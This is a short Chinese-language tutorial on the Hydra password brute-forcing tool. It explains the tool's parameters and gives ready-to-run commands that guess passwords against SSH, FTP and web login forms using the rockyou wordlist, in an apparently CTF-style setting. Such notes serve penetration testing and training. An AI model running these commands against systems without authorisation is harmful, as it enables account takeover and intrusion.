### 什么是 Hydra？
Hydra（九头蛇）是一款**在线密码爆破工具**，用于尝试登录各种网络服务（SSH、FTP、RDP、HTTP 表单等）。

**与 John 的区别**：

- John = **离线**破解（你已经有哈希值）
- Hydra = **在线**爆破（你尝试登录目标服务）
#### 核心用法
```bash
hydra -l 用户名 -P 密码字典 协议://目标IP
```
#### 常用参数

| 参数  | 说明               |
| --- | ---------------- |
| -l  | 指定单个用户名          |
| -L  | 指定用户名字典文件        |
| -p  | 指定单个密码           |
| -P  | 指定密码字典文件         |
| -t  | 设置线程数（默认16，越大越快） |
| -vV | 显示详细过程，方便看进度     |
| -f  | 找到有效密码后停止        |
| -s  | 指定非标准端口号         |
### 实战场景
#### 1. SSH 爆破
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 192.168.1.100 ssh
```
#### 2. FTP 爆破
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
```
#### 3. Web 表单（POST 方法）爆破
```bash
hydra -l 用户名 -P 密码字典 目标IP http-post-form "/路径:username=^USER^&password=^PASS^:失败标志" -V
```
**示例**：
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```